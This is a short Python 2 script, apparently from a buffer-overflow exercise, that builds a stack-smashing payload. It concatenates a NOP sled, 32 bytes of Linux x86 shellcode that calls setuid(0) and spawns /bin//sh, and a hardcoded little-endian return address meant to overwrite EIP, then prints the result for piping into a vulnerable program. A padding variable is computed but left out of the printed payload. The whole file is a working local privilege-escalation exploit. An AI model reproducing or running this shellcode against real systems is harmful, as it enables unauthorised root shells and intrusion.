#!/usr/bin/python 

#takes some trial and error to figure out how many we need.
#adjust so the shellcode + eip are aligned
#on a word boundary (divisble by 4)

#buffer size 100
nopsled = '\x90' * 64

#buffer size 500
#nopsled = '\x90' * 476

#shellcode is 32 bytes long.
shellcode = (
'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
)

#I'm gangta and need no padding. 
#padding is the like the sloppy shot in pool!

#buffer size 100
padding = 'A' * (112 - 64 - 32)

#Use GDB and find an address within the buffer
#convert to little endian

#buffer 100
eip = '\x40\xfd\xff\xbf'

#eip = '\xa0\xfa\xff\xbf'
print nopsled + shellcode + eip
